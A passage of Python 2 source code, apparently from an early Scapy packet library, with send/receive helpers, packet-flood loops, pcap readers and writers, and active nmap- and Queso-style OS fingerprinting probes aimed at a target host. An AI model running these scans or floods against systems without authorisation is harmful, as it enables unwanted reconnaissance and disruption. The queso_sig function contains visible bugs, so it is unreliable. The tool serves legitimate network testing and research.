                                            os.write(1, "*")
                                        ok = 1
                                        if not multi:
                                            del(hlst[i])
                                            notans -= 1;
                                        else:
                                            if not hasattr(hlst[i], '_answered'):
                                                notans -= 1;
                                            hlst[i]._answered = 1;
                                        break
                            if notans == 0 and not multi:
                                break
                            if not ok:
                                if verbose > 1:
                                    os.write(1, ".")
                                nbrecv += 1
                                if conf.debug_match:
                                    debug.recv.append(r)
                    except KeyboardInterrupt:
                        if chainCC:
                            raise
                finally:
                    try:
                        ac,sent_times = cPickle.load(rdpipe)
                    except EOFError:
                        warning("Child died unexpectedly. Packets may have not been sent %i"%os.getpid())
                    else:
                        arp_cache.update(ac)
                        for p,t in zip(all_stimuli, sent_times):
                            p.sent_time = t
                    os.waitpid(pid,0)
        finally:
            if pid == 0:
                os._exit(0)

        remain = reduce(list.__add__, hsent.values(), [])
        if multi:
            remain = filter(lambda p: not hasattr(p, '_answered'), remain);

        if autostop and len(remain) > 0 and len(remain) != len(tobesent):
            retry = autostop

        tobesent = remain
        if len(tobesent) == 0:
            break
        retry -= 1

    if conf.debug_match:
        debug.sent=PacketList(remain[:],"Sent")
        debug.match=SndRcvList(ans[:])

    #clean the ans list to delete the field _answered
    if (multi):
        for s,r in ans:
            if hasattr(s, '_answered'):
                del(s._answered)

    if verbose:
        print "\nReceived %i packets, got %i answers, remaining %i packets" % (nbrecv+len(ans), len(ans), notans)
    return SndRcvList(ans),PacketList(remain,"Unanswered"),debug.recv


def __gen_send(s, x, inter=0, loop=0, count=None, verbose=None, *args, **kargs):
    if not isinstance(x, Gen):
        x = SetGen(x)
    if verbose is None:
        verbose = conf.verb
    n = 0
    if count is not None:
        loop = -count
    elif not loop:
        loop=-1
    try:
        while loop:
            for p in x:
                s.send(p)
                n += 1
                if verbose:
                    os.write(1,".")
                time.sleep(inter)
            if loop < 0:
                loop += 1
    except KeyboardInterrupt:
        pass
    s.close()
    if verbose:
        print "\nSent %i packets." % n

def send(x, inter=0, loop=0, count=None, verbose=None, *args, **kargs):
    """Send packets at layer 3
send(packets, [inter=0], [loop=0], [verbose=conf.verb]) -> None"""
    __gen_send(conf.L3socket(*args, **kargs), x, inter=inter, loop=loop, count=count,verbose=verbose)

def sendp(x, inter=0, loop=0, iface=None, iface_hint=None, count=None, verbose=None, *args, **kargs):
    """Send packets at layer 2
send(packets, [inter=0], [loop=0], [verbose=conf.verb]) -> None"""
    if iface is None and iface_hint is not None:
        iface = conf.route.route(iface_hint)[0]
    __gen_send(conf.L2socket(iface=iface, *args, **kargs), x, inter=inter, loop=loop, count=count, verbose=verbose)

def sendpfast(x, pps=None, mbps=None, realtime=None, loop=0, iface=None):
    """Send packets at layer 2 using tcpreplay for performance
    pps:  packets per second
    mpbs: MBits per second
    realtime: use packet's timestamp, bending time with realtime value
    loop: number of times to process the packet list
    iface: output interface """
    if iface is None:
        iface = conf.iface
    options = ["--intf1=%s" % iface ]
    if pps is not None:
        options.append("--pps=%i" % pps)
    elif mbps is not None:
        options.append("--mbps=%i" % mbps)
    elif realtime is not None:
        options.append("--multiplier=%i" % realtime)
    else:
        options.append("--topspeed")

    if loop:
        options.append("--loop=%i" % loop)

    f = os.tempnam("scapy")
    options.append(f)
    wrpcap(f, x)
    try:
        try:
            os.spawnlp(os.P_WAIT, conf.prog.tcpreplay, conf.prog.tcpreplay, *options)
        except KeyboardInterrupt:
            log_interactive.info("Interrupted by user")
    finally:
        os.unlink(f)





def sr(x,filter=None, iface=None, nofilter=0, *args,**kargs):
    """Send and receive packets at layer 3
nofilter: put 1 to avoid use of bpf filters
retry:    if positive, how many times to resend unanswered packets
          if negative, how many times to retry when no more packets are answered
timeout:  how much time to wait after the last packet has been sent
verbose:  set verbosity level
multi:    whether to accept multiple answers for the same stimulus
filter:   provide a BPF filter
iface:    listen answers only on the given interface"""
    if not kargs.has_key("timeout"):
        kargs["timeout"] = -1
    s = conf.L3socket(filter=filter, iface=iface, nofilter=nofilter)
    a,b,c=sndrcv(s,x,*args,**kargs)
    s.close()
    return a,b

def sr1(x,filter=None,iface=None, nofilter=0, *args,**kargs):
    """Send packets at layer 3 and return only the first answer
nofilter: put 1 to avoid use of bpf filters
retry:    if positive, how many times to resend unanswered packets
          if negative, how many times to retry when no more packets are answered
timeout:  how much time to wait after the last packet has been sent
verbose:  set verbosity level
multi:    whether to accept multiple answers for the same stimulus
filter:   provide a BPF filter
iface:    listen answers only on the given interface"""
    if not kargs.has_key("timeout"):
        kargs["timeout"] = -1
    s=conf.L3socket(filter=filter, nofilter=nofilter, iface=iface)
    a,b,c=sndrcv(s,x,*args,**kargs)
    s.close()
    if len(a) > 0:
        return a[0][1]
    else:
        return None

def srp(x,iface=None, iface_hint=None, filter=None, nofilter=0, type=ETH_P_ALL, *args,**kargs):
    """Send and receive packets at layer 2
nofilter: put 1 to avoid use of bpf filters
retry:    if positive, how many times to resend unanswered packets
          if negative, how many times to retry when no more packets are answered
timeout:  how much time to wait after the last packet has been sent
verbose:  set verbosity level
multi:    whether to accept multiple answers for the same stimulus
filter:   provide a BPF filter
iface:    work only on the given interface"""
    if not kargs.has_key("timeout"):
        kargs["timeout"] = -1
    if iface is None and iface_hint is not None:
        iface = conf.route.route(iface_hint)[0]
    a,b,c=sndrcv(conf.L2socket(iface=iface, filter=filter, nofilter=nofilter, type=type),x,*args,**kargs)
    return a,b

def srp1(*args,**kargs):
    """Send and receive packets at layer 2 and return only the first answer
nofilter: put 1 to avoid use of bpf filters
retry:    if positive, how many times to resend unanswered packets
          if negative, how many times to retry when no more packets are answered
timeout:  how much time to wait after the last packet has been sent
verbose:  set verbosity level
multi:    whether to accept multiple answers for the same stimulus
filter:   provide a BPF filter
iface:    work only on the given interface"""
    if not kargs.has_key("timeout"):
        kargs["timeout"] = -1
    a,b=srp(*args,**kargs)
    if len(a) > 0:
        return a[0][1]
    else:
        return None

def __sr_loop(srfunc, pkts, prn=lambda x:x[1].summary(), prnfail=lambda x:x.summary(), inter=1, timeout=None, count=None, verbose=0, store=1, *args, **kargs):
    n = 0
    r = 0
    ct = conf.color_theme
    parity = 0
    ans=[]
    unans=[]
    if timeout is None:
        timeout = min(2*inter, 5)
    try:
        while 1:
            parity ^= 1
            col = [ct.even,ct.odd][parity]
            if count is not None:
                if count == 0:
                    break
                count -= 1
            start = time.time()
            print "\rsend...\r",
            res = srfunc(pkts, timeout=timeout, verbose=0, chainCC=1, *args, **kargs)
            n += len(res[0])+len(res[1])
            r += len(res[0])
            if prn and len(res[0]) > 0:
                msg = "RECV %i:" % len(res[0])
                print  "\r"+ct.success(msg),
                for p in res[0]:
                    print col(prn(p))
                    print " "*len(msg),
            if prnfail and len(res[1]) > 0:
                msg = "fail %i:" % len(res[1])
                print "\r"+ct.fail(msg),
                for p in res[1]:
                    print col(prnfail(p))
                    print " "*len(msg),
            if not (prn or prnfail):
                print "recv:%i  fail:%i" % tuple(map(len, res[:2]))
            if store:
                ans += res[0]
                unans += res[1]
            end=time.time()
            if end-start < inter:
                time.sleep(inter+start-end)
    except KeyboardInterrupt:
        pass

    if n>0:
        print "%s\nSent %i packets, received %i packets. %3.1f%% hits." % (Color.normal,n,r,100.0*r/n)

    return SndRcvList(ans),PacketList(unans)

def srloop(pkts, *args, **kargs):
    """Send a packet at layer 3 in loop and print the answer each time
srloop(pkts, [prn], [inter], [count], ...) --> None"""
    return __sr_loop(sr, pkts, *args, **kargs)

def srploop(pkts, *args, **kargs):
    """Send a packet at layer 2 in loop and print the answer each time
srloop(pkts, [prn], [inter], [count], ...) --> None"""
    return __sr_loop(srp, pkts, *args, **kargs)


def sndrcvflood(pks, pkt, prn=lambda (s,r):r.summary(), chainCC=0, store=1, unique=0):
    if not isinstance(pkt, Gen):
        pkt = SetGen(pkt)
    tobesent = [p for p in pkt]
    received = SndRcvList()
    seen = {}

    hsent={}
    for i in tobesent:
        h = i.hashret()
        if h in hsent:
            hsent[h].append(i)
        else:
            hsent[h] = [i]

    def send_in_loop(tobesent):
        while 1:
            for p in tobesent:
                yield p

    packets_to_send = send_in_loop(tobesent)

    ssock = rsock = pks.fileno()

    try:
        while 1:
            readyr,readys,_ = select([rsock],[ssock],[])
            if ssock in readys:
                pks.send(packets_to_send.next())

            if rsock in readyr:
                p = pks.recv(MTU)
                if p is None:
                    continue
                h = p.hashret()
                if h in hsent:
                    hlst = hsent[h]
                    for i in hlst:
                        if p.answers(i):
                            res = prn((i,p))
                            if unique:
                                if res in seen:
                                    continue
                                seen[res] = None
                            if res is not None:
                                print res
                            if store:
                                received.append((i,p))
    except KeyboardInterrupt:
        if chainCC:
            raise
    return received

def srflood(x,filter=None, iface=None, nofilter=None, *args,**kargs):
    """Flood and receive packets at layer 3
prn:      function applied to packets received. Ret val is printed if not None
store:    if 1 (default), store answers and return them
unique:   only consider packets whose print
nofilter: put 1 to avoid use of bpf filters
filter:   provide a BPF filter
iface:    listen answers only on the given interface"""
    s = conf.L3socket(filter=filter, iface=iface, nofilter=nofilter)
    r=sndrcvflood(s,x,*args,**kargs)
    s.close()
    return r

def srpflood(x,filter=None, iface=None, iface_hint=None, nofilter=None, *args,**kargs):
    """Flood and receive packets at layer 2
prn:      function applied to packets received. Ret val is printed if not None
store:    if 1 (default), store answers and return them
unique:   only consider packets whose print
nofilter: put 1 to avoid use of bpf filters
filter:   provide a BPF filter
iface:    listen answers only on the given interface"""
    if iface is None and iface_hint is not None:
        iface = conf.route.route(iface_hint)[0]
    s = conf.L2socket(filter=filter, iface=iface, nofilter=nofilter)
    r=sndrcvflood(s,x,*args,**kargs)
    s.close()
    return r


## Bluetooth


def srbt(peer, pkts, inter=0.1, *args, **kargs):
    s = conf.BTsocket(peer=peer)
    a,b,c=sndrcv(s,pkts,inter=inter,*args,**kargs)
    s.close()
    return a,b

def srbt1(peer, pkts, *args, **kargs):
    a,b = srbt(peer, pkts, *args, **kargs)
    if len(a) > 0:
        return a[0][1]





#############################
## pcap capture file stuff ##
#############################

def wrpcap(filename, pkt, *args, **kargs):
    """Write a list of packets to a pcap file
gz: set to 1 to save a gzipped capture
linktype: force linktype value
endianness: "<" or ">", force endianness"""
    PcapWriter(filename, *args, **kargs).write(pkt)

def rdpcap(filename, count=-1):
    """Read a pcap file and return a packet list
count: read only <count> packets"""
    return PcapReader(filename).read_all(count=count)

class PcapReader:
    """A stateful pcap reader

    Based entirely on scapy.rdpcap(), this class allows for packets
    to be dispatched without having to be loaded into memory all at
    once
    """

    def __init__(self, filename):
        self.filename = filename
        try:
            self.f = gzip.open(filename,"rb")
            magic = self.f.read(4)
        except IOError:
            self.f = open(filename,"rb")
            magic = self.f.read(4)
        if magic == "\xa1\xb2\xc3\xd4": #big endian
            self.endian = ">"
        elif  magic == "\xd4\xc3\xb2\xa1": #little endian
            self.endian = "<"
        else:
            raise RuntimeWarning, "Not a pcap capture file (bad magic)"
        hdr = self.f.read(20)
        if len(hdr)<20:
            raise RuntimeWarning, "Invalid pcap file (too short)"
        vermaj,vermin,tz,sig,snaplen,linktype = struct.unpack(self.endian+"HHIIII",hdr)
        self.LLcls = LLTypes.get(linktype, Raw)
        if self.LLcls == Raw:
            warning("PcapReader: unkonwon LL type [%i]/[%#x]. Using Raw packets" % (linktype,linktype))

    def __iter__(self):
        return self

    def next(self):
        """impliment the iterator protocol on a set of packets in a
        pcap file
        """
        pkt = self.read_packet()
        if pkt == None:
            raise StopIteration
        return pkt


    def read_packet(self):
        """return a single packet read from the file

        returns None when no more packets are available
        """
        hdr = self.f.read(16)
        if len(hdr) < 16:
            return None
        sec,usec,caplen,olen = struct.unpack(self.endian+"IIII", hdr)
        s = self.f.read(caplen)
        try:
            p = self.LLcls(s)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            p = Raw(s)
        p.time = sec+0.000001*usec
        return p

    def dispatch(self, callback):
        """call the specified callback routine for each packet read

        This is just a convienience function for the main loop
        that allows for easy launching of packet processing in a
        thread.
        """
        p = self.read_packet()
        while p != None:
            callback(p)
            p = self.read_packet()

    def read_all(self,count=-1):
        """return a list of all packets in the pcap file
        """
        res=[]
        while count != 0:
            count -= 1
            p = self.read_packet()
            if p is None:
                break
            res.append(p)
        return PacketList(res,name = os.path.basename(self.filename))

    def recv(self, size):
        """ Emulate a socket
        """
        return self.read_packet()

    def fileno(self):
        return self.f.fileno()



class PcapWriter:
    """A pcap writer with more control than wrpcap()

    This routine is based entirely on scapy.wrpcap(), but adds capability
    of writing one packet at a time in a streaming manner.
    """
    def __init__(self, filename, linktype=None, gz=0, endianness=""):
        self.linktype = linktype
        self.header_done = 0
        if gz:
            self.f = gzip.open(filename,"wb")
        else:
            self.f = open(filename,"wb")
        self.endian = endianness

    def fileno(self):
        return self.f.fileno()

    def write(self, pkt):
        """accepts a either a single packet or a list of packets
        to be written to the dumpfile
        """

        if self.header_done == 0:
            if self.linktype == None:
                if isinstance(pkt,Packet):
                    self.linktype = LLNumTypes.get(pkt.__class__,1)
                else:
                    self.linktype = LLNumTypes.get(pkt[0].__class__,1)

            self.f.write(struct.pack(self.endian+"IHHIIII", 0xa1b2c3d4L,
                                     2, 4, 0, 0, MTU, self.linktype))
            self.header_done = 1

        for p in pkt:
            self._write_packet(p)

    def _write_packet(self, packet):
        """writes a single packet to the pcap file
        """
        s = str(packet)
        l = len(s)
        sec = int(packet.time)
        usec = int((packet.time-sec)*1000000)
        self.f.write(struct.pack(self.endian+"IIII", sec, usec, l, l))
        self.f.write(s)

re_extract_hexcap = re.compile("^(0x[0-9a-fA-F]{2,}[ :\t]|(0x)?[0-9a-fA-F]{2,}:|(0x)?[0-9a-fA-F]{3,}[: \t]|) *(([0-9a-fA-F]{2} {,2}){,16})")

def import_hexcap():
    p = ""
    try:
        while 1:
            l = raw_input().strip()
            try:
                p += re_extract_hexcap.match(l).groups()[3]
            except:
                warning("Parsing error during hexcap")
                continue
    except EOFError:
        pass

    p = p.replace(" ","")
    p2=""
    for i in range(len(p)/2):
        p2 += chr(int(p[2*i:2*i+2],16))
    return p2



def wireshark(pktlist):
    f = os.tempnam("scapy")
    wrpcap(f, pktlist)
    os.spawnlp(os.P_NOWAIT, conf.prog.wireshark, conf.prog.wireshark, "-r", f)

def hexedit(x):
    x = str(x)
    f = os.tempnam("scapy")
    open(f,"w").write(x)
    os.spawnlp(os.P_WAIT, conf.prog.hexedit, conf.prog.hexedit, f)
    x = open(f).read()
    os.unlink(f)
    return x


#####################
## knowledge bases ##
#####################

class KnowledgeBase:
    def __init__(self, filename):
        self.filename = filename
        self.base = None

    def lazy_init(self):
        self.base = ""

    def reload(self, filename = None):
        if filename is not None:
            self.filename = filename
        oldbase = self.base
        self.base = None
        self.lazy_init()
        if self.base is None:
            self.base = oldbase

    def get_base(self):
        if self.base is None:
            self.lazy_init()
        return self.base



##########################
## IP location database ##
##########################

class IPCountryKnowledgeBase(KnowledgeBase):
    """
How to generate the base :
db = []
for l in open("GeoIPCountryWhois.csv").readlines():
    s,e,c = l.split(",")[2:5]
    db.append((int(s[1:-1]),int(e[1:-1]),c[1:-1]))
cPickle.dump(gzip.open("xxx","w"),db)
"""
    def lazy_init(self):
        self.base = load_object(self.filename)


class CountryLocKnowledgeBase(KnowledgeBase):
    def lazy_init(self):
        f=open(self.filename)
        self.base = {}
        while 1:
            l = f.readline()
            if not l:
                break
            l = l.strip().split(",")
            if len(l) != 3:
                continue
            c,lat,long = l

            self.base[c] = (float(long),float(lat))
        f.close()




def locate_ip(ip):
    ip=map(int,ip.split("."))
    ip = ip[3]+(ip[2]<<8L)+(ip[1]<<16L)+(ip[0]<<24L)

    cloc = country_loc_kdb.get_base()
    db = IP_country_kdb.get_base()

    d=0
    f=len(db)-1
    while (f-d) > 1:
        guess = (d+f)/2
        if ip > db[guess][0]:
            d = guess
        else:
            f = guess
    s,e,c = db[guess]
    if  s <= ip and ip <= e:
        return cloc.get(c,None)




###############
## p0f stuff ##
###############

# File format (according to p0f.fp) :
#
# wwww:ttt:D:ss:OOO...:QQ:OS:Details
#
# wwww    - window size
# ttt     - initial TTL
# D       - don't fragment bit  (0=unset, 1=set)
# ss      - overall SYN packet size
# OOO     - option value and order specification
# QQ      - quirks list
# OS      - OS genre
# details - OS description



class p0fKnowledgeBase(KnowledgeBase):
    def __init__(self, filename):
        KnowledgeBase.__init__(self, filename)
        #self.ttl_range=[255]
    def lazy_init(self):
        try:
            f=open(self.filename)
        except IOError:
            warning("Can't open base %s" % self.filename)
            return
        try:
            self.base = []
            for l in f:
                if l[0] in ["#","\n"]:
                    continue
                l = tuple(l.split(":"))
                if len(l) < 8:
                    continue
                li = map(int,l[1:4])
                #if li[0] not in self.ttl_range:
                #    self.ttl_range.append(li[0])
                #    self.ttl_range.sort()
                self.base.append((l[0], li[0], li[1], li[2], l[4], l[5], l[6], l[7][:-1]))
        except:
            warning("Can't parse p0f database (new p0f version ?)")
            self.base = None
        f.close()


def packet2p0f(pkt):
    while pkt.haslayer(IP) and pkt.haslayer(TCP):
        pkt = pkt.getlayer(IP)
        if isinstance(pkt.payload, TCP):
            break
        pkt = pkt.payload

    if not isinstance(pkt, IP) or not isinstance(pkt.payload, TCP):
        raise TypeError("Not a TCP/IP packet")
    if pkt.payload.flags & 0x13 != 0x02: #S,!A,!F
        raise TypeError("Not a syn packet")

    #t = p0f_kdb.ttl_range[:]
    #t += [pkt.ttl]
    #t.sort()
    #ttl=t[t.index(pkt.ttl)+1]
    ttl = pkt.ttl

    df = (pkt.flags & 2) / 2
    ss = len(pkt)
    # from p0f/config.h : PACKET_BIG = 100
    if ss > 100:
        ss = 0

    ooo = ""
    mss = -1
    qqT = False
    qqP = False
    #qqBroken = False
    ilen = (pkt[TCP].dataofs << 2) - 20 # from p0f.c
    for option in pkt.payload.options:
        ilen -= 1
        if option[0] == "MSS":
            ooo += "M" + str(option[1]) + ","
            mss = option[1]
            # FIXME: qqBroken
            ilen -= 3
        elif option[0] == "WScale":
            ooo += "W" + str(option[1]) + ","
            # FIXME: qqBroken
            ilen -= 2
        elif option[0] == "Timestamp":
            if option[1][0] == 0:
                ooo += "T0,"
            else:
                ooo += "T,"
            if option[1][1] != 0:
                qqT = True
            ilen -= 9
        elif option[0] == "SAckOK":
            ooo += "S,"
            ilen -= 1
        elif option[0] == "NOP":
            ooo += "N,"
        elif option[0] == "EOL":
            ooo += "E,"
            if ilen > 0:
                qqP = True
        else:
            ooo += "?,"
            # FIXME: ilen
    ooo = ooo[:-1]
    if ooo == "": ooo = "."

    win = pkt.payload.window
    if mss != -1:
        if win % mss == 0:
            win = "S" + str(win/mss)
        elif win % (mss + 40) == 0:
            win = "T" + str(win/(mss+40))
        win = str(win)

    qq = ""

    if qqP:
        qq += "P"
    if pkt[IP].id == 0:
        qq += "Z"
    if pkt[IP].options != '':
        qq += "I"
    if pkt[TCP].urgptr != 0:
        qq += "U"
    if pkt[TCP].reserved != 0:
        qq += "X"
    if pkt[TCP].ack != 0:
        qq += "A"
    if qqT:
        qq += "T"
    if pkt[TCP].flags & 40 != 0:
        # U or P
        qq += "F"
    if not isinstance(pkt[TCP].payload, NoPayload):
        qq += "D"
    # FIXME : "!" - broken options segment

    if qq == "":
        qq = "."

    return (win,
            ttl,
            df,
            ss,
            ooo,
            qq)

def p0f_correl(x,y):
    d = 0
    # wwww can be "*" or "%nn"
    d += (x[0] == y[0] or y[0] == "*" or (y[0][0] == "%" and x[0].isdigit() and (int(x[0]) % int(y[0][1:])) == 0))
    # ttl
    d += (y[1] >= x[1] and y[1] - x[1] < 32)
    for i in [2, 3, 5]:
        d += (x[i] == y[i])
    xopt = x[4].split(",")
    yopt = y[4].split(",")
    if len(xopt) == len(yopt):
        same = True
        for i in range(len(xopt)):
            if not (xopt[i] == yopt[i] or
                    (len(yopt[i]) == 2 and len(xopt[i]) > 1 and
                     yopt[i][1] == "*" and xopt[i][0] == yopt[i][0]) or
                    (len(yopt[i]) > 2 and len(xopt[i]) > 1 and
                     yopt[i][1] == "%" and xopt[i][0] == yopt[i][0] and
                     int(xopt[i][1:]) % int(yopt[i][2:]) == 0)):
                same = False
                break
        if same:
            d += len(xopt)
    return d


def p0f(pkt):
    """Passive OS fingerprinting: which OS emitted this TCP SYN ?
p0f(packet) -> accuracy, [list of guesses]
"""
    pb = p0f_kdb.get_base()
    if not pb:
        warning("p0f base empty.")
        return []
    s = len(pb[0][0])
    r = []
    sig = packet2p0f(pkt)
    max = len(sig[4].split(",")) + 5
    for b in pb:
        d = p0f_correl(sig,b)
        if d == max:
            r.append((b[6], b[7], b[1] - pkt[IP].ttl))
    return r


def prnp0f(pkt):
    try:
        r = p0f(pkt)
    except:
        return
    if r == []:
        r = ("UNKNOWN", "[" + ":".join(map(str, packet2p0f(pkt))) + ":?:?]", None)
    else:
        r = r[0]
    uptime = None
    try:
        uptime = pkt2uptime(pkt)
    except:
        pass
    if uptime == 0:
        uptime = None
    res = pkt.sprintf("%IP.src%:%TCP.sport% - " + r[0] + " " + r[1])
    if uptime is not None:
        res += pkt.sprintf(" (up: " + str(uptime/3600) + " hrs)\n  -> %IP.dst%:%TCP.dport%")
    else:
        res += pkt.sprintf("\n  -> %IP.dst%:%TCP.dport%")
    if r[2] is not None:
        res += " (distance " + str(r[2]) + ")"
    print res


def pkt2uptime(pkt, HZ=100):
    """Calculate the date the machine which emitted the packet booted using TCP timestamp
pkt2uptime(pkt, [HZ=100])"""
    if not isinstance(pkt, Packet):
        raise TypeError("Not a TCP packet")
    if isinstance(pkt,NoPayload):
        raise TypeError("Not a TCP packet")
    if not isinstance(pkt, TCP):
        return pkt2uptime(pkt.payload)
    for opt in pkt.options:
        if opt[0] == "Timestamp":
            #t = pkt.time - opt[1][0] * 1.0/HZ
            #return time.ctime(t)
            t = opt[1][0] / HZ
            return t
    raise TypeError("No timestamp option")



#################
## Queso stuff ##
#################


def quesoTCPflags(flags):
    if flags == "-":
        return "-"
    flv = "FSRPAUXY"
    v = 0
    for i in flags:
        v |= 2**flv.index(i)
    return "%x" % v

class QuesoKnowledgeBase(KnowledgeBase):
    def lazy_init(self):
        try:
            f = open(self.filename)
        except IOError:
            return
        self.base = {}
        p = None
        try:
            for l in f:
                l = l.strip()
                if not l or l[0] == ';':
                    continue
                if l[0] == '*':
                    if p is not None:
                        p[""] = name
                    name = l[1:].strip()
                    p = self.base
                    continue
                if l[0] not in list("0123456"):
                    continue
                res = l[2:].split()
                res[-1] = quesoTCPflags(res[-1])
                res = " ".join(res)
                if not p.has_key(res):
                    p[res] = {}
                p = p[res]
            if p is not None:
                p[""] = name
        except:
            self.base = None
            warning("Can't load queso base [%s]", self.filename)
        f.close()




def queso_sig(target, dport=80, timeout=3):
    p = queso_kdb.get_base()
    ret = []
    for flags in ["S", "SA", "F", "FA", "SF", "P", "SEC"]:
        ans, unans = sr(IP(dst=target)/TCP(dport=dport,flags=flags,seq=RandInt()),
                        timeout=timeout, verbose=0)
        if len(ans) == 0:
            rs = "- - - -"
        else:
            s,r = ans[0]
            rs = "%i" % (r.seq != 0)
            if not r.ack:
                r += " 0"
            elif r.ack-s.seq > 666:
                rs += " R" % 0
            else:
                rs += " +%i" % (r.ack-s.seq)
            rs += " %X" % r.window
            rs += " %x" % r.payload.flags
        ret.append(rs)
    return ret

def queso_search(sig):
    p = queso_kdb.get_base()
    sig.reverse()
    ret = []
    try:
        while sig:
            s = sig.pop()
            p = p[s]
            if p.has_key(""):
                ret.append(p[""])
    except KeyError:
        pass
    return ret


def queso(*args,**kargs):
    """Queso OS fingerprinting
queso(target, dport=80, timeout=3)"""
    return queso_search(queso_sig(*args, **kargs))



######################
## nmap OS fp stuff ##
######################


class NmapKnowledgeBase(KnowledgeBase):
    def lazy_init(self):
        try:
            f=open(self.filename)
        except IOError:
            return

        self.base = []
        name = None
        try:
            for l in f:
                l = l.strip()
                if not l or l[0] == "#":
                    continue
                if l[:12] == "Fingerprint ":
                    if name is not None:
                        self.base.append((name,sig))
                    name = l[12:].strip()
                    sig={}
                    p = self.base
                    continue
                elif l[:6] == "Class ":
                    continue
                op = l.find("(")
                cl = l.find(")")
                if op < 0 or cl < 0:
                    warning("error reading nmap os fp base file")
                    continue
                test = l[:op]
                s = map(lambda x: x.split("="), l[op+1:cl].split("%"))
                si = {}
                for n,v in s:
                    si[n] = v
                sig[test]=si
            if name is not None:
                self.base.append((name,sig))
        except:
            self.base = None
            warning("Can't read nmap database [%s](new nmap version ?)" % self.filename)
        f.close()

def TCPflags2str(f):
    fl="FSRPAUEC"
    s=""
    for i in range(len(fl)):
        if f & 1:
            s = fl[i]+s
        f >>= 1
    return s

def nmap_tcppacket_sig(pkt):
    r = {}
    if pkt is not None:
#        r["Resp"] = "Y"
        r["DF"] = (pkt.flags & 2) and "Y" or "N"
        r["W"] = "%X" % pkt.window
        r["ACK"] = pkt.ack==2 and "S++" or pkt.ack==1 and "S" or "O"
        r["Flags"] = TCPflags2str(pkt.payload.flags)
        r["Ops"] = "".join(map(lambda x: x[0][0],pkt.payload.options))
    else:
        r["Resp"] = "N"
    return r


def nmap_udppacket_sig(S,T):
    r={}
    if T is None:
        r["Resp"] = "N"
    else:
        r["DF"] = (T.flags & 2) and "Y" or "N"
        r["TOS"] = "%X" % T.tos
        r["IPLEN"] = "%X" % T.len
        r["RIPTL"] = "%X" % T.payload.payload.len
        r["RID"] = S.id == T.payload.payload.id and "E" or "F"
        r["RIPCK"] = S.chksum == T.getlayer(IPerror).chksum and "E" or T.getlayer(IPerror).chksum == 0 and "0" or "F"
        r["UCK"] = S.payload.chksum == T.getlayer(UDPerror).chksum and "E" or T.getlayer(UDPerror).chksum ==0 and "0" or "F"
        r["ULEN"] = "%X" % T.getlayer(UDPerror).len
        r["DAT"] = T.getlayer(Raw) is None and "E" or S.getlayer(Raw).load == T.getlayer(Raw).load and "E" or "F"
    return r



def nmap_match_one_sig(seen, ref):
    c = 0
    for k in seen.keys():
        if ref.has_key(k):
            if seen[k] in ref[k].split("|"):
                c += 1
    if c == 0 and seen.get("Resp") == "N":
        return 0.7
    else:
        return 1.0*c/len(seen.keys())



def nmap_sig(target, oport=80, cport=81, ucport=1):
    res = {}

    tcpopt = [ ("WScale", 10),
               ("NOP",None),
               ("MSS", 256),
               ("Timestamp",(123,0)) ]
    tests = [ IP(dst=target, id=1)/TCP(seq=1, sport=5001, dport=oport, options=tcpopt, flags="CS"),
              IP(dst=target, id=1)/TCP(seq=1, sport=5002, dport=oport, options=tcpopt, flags=0),
              IP(dst=target, id=1)/TCP(seq=1, sport=5003, dport=oport, options=tcpopt, flags="SFUP"),
              IP(dst=target, id=1)/TCP(seq=1, sport=5004, dport=oport, options=tcpopt, flags="A"),
              IP(dst=target, id=1)/TCP(seq=1, sport=5005, dport=cport, options=tcpopt, flags="S"),
              IP(dst=target, id=1)/TCP(seq=1, sport=5006, dport=cport, options=tcpopt, flags="A"),
              IP(dst=target, id=1)/TCP(seq=1, sport=5007, dport=cport, options=tcpopt, flags="FPU"),
              IP(str(IP(dst=target)/UDP(sport=5008,dport=ucport)/(300*"i"))) ]

    ans, unans = sr(tests, timeout=2)
    ans += map(lambda x: (x,None), unans)

    for S,T in ans:
        if S.sport == 5008:
            res["PU"] = nmap_udppacket_sig(S,T)
        else:
            t = "T%i" % (S.sport-5000)
            if T is not None and T.haslayer(ICMP):
                warning("Test %s answered by an ICMP" % t)
                T=None
            res[t] = nmap_tcppacket_sig(T)

    return res

def nmap_probes2sig(tests):
    tests=tests.copy()
    res = {}
    if "PU" in tests:
        res["PU"] = nmap_udppacket_sig(*tests["PU"])
        del(tests["PU"])
    for k in tests:
        res[k] = nmap_tcppacket_sig(tests[k])
    return res


def nmap_search(sigs):
    guess = 0,[]
    for os,fp in nmap_kdb.get_base():
        c = 0.0
        for t in sigs.keys():
            if t in fp:
                c += nmap_match_one_sig(sigs[t], fp[t])
        c /= len(sigs.keys())
        if c > guess[0]:
            guess = c,[ os ]
        elif c == guess[0]:
            guess[1].append(os)
    return guess


def nmap_fp(target, oport=80, cport=81):
    """nmap fingerprinting
nmap_fp(target, [oport=80,] [cport=81,]) -> list of best guesses with accuracy
"""
    sigs = nmap_sig(target, oport, cport)
    return nmap_search(sigs)


def nmap_sig2txt(sig):
    torder = ["TSeq","T1","T2","T3","T4","T5","T6","T7","PU"]
    korder = ["Class", "gcd", "SI", "IPID", "TS",
              "Resp", "DF", "W", "ACK", "Flags", "Ops",
              "TOS", "IPLEN", "RIPTL", "RID", "RIPCK", "UCK", "ULEN", "DAT" ]
    txt=[]
    for i in sig.keys():
        if i not in torder:
            torder.append(i)
    for t in torder:
        sl = sig.get(t)
        if sl is None:
            continue
        s = []
        for k in korder:
            v = sl.get(k)
            if v is None:
                continue
            s.append("%s=%s"%(k,v))
        txt.append("%s(%s)" % (t, "%".join(s)))
    return "\n".join(txt)





###################
## User commands ##
###################


def sniff(count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, *arg, **karg):
    """Sniff packets
sniff([count=0,] [prn=None,] [store=1,] [offline=None,] [lfilter=None,] + L2ListenSocket args) -> list of packets

  count: number of packets to capture. 0 means infinity
  store: wether to store sniffed packets or discard them
    prn: function to apply to each packet. If something is returned,
         it is displayed. Ex:
         ex: prn = lambda x: x.summary()
lfilter: python function applied to each packet to determine
         if further action may be done
         ex: lfilter = lambda x: x.haslayer(Padding)
offline: pcap file to read packets from, instead of sniffing them
timeout: stop sniffing after a given time (default: None)
L2socket: use the provided L2socket
    """
    c = 0

    if offline is None:
        if L2socket is None:
            L2socket = conf.L2listen
        s = L2socket(type=ETH_P_ALL, *arg, **karg)
    else:
        s = PcapReader(offline)

    lst = []
    if timeout is not None:
        stoptime = time.time()+timeout
    remain = None
    while 1:
        try:
            if timeout is not None:
                remain = stoptime-time.time()
